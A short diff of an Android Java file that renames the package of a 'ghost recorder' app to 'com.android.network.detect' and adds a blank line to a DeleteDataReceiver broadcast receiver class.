@@ -1,4 +1,4 @@
-package com.byteshaft.ghostrecorder;
+package com.android.network.detect;
 
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -6,6 +6,7 @@ import android.content.Intent;
 import android.util.Log;
 
 public class DeleteDataReceiver extends BroadcastReceiver {
+
     private final String LOG_TAG = AppGlobals.getLogTag(getClass());
 
     @Override
